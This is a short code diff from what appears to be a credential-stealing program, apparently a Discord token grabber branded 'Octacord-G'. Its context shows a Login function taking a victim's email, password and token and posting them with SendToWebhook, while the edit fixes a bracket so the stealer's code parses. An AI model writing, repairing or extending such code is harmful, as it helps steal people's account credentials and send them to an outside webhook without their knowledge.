@@ -288,7 +288,7 @@ function Login(email, password, token) {
 					"text": "Octacord-G"
 				}
                         
-                        }]
+                        ]
                     }
                     SendToWebhook(JSON.stringify(params))
                 })
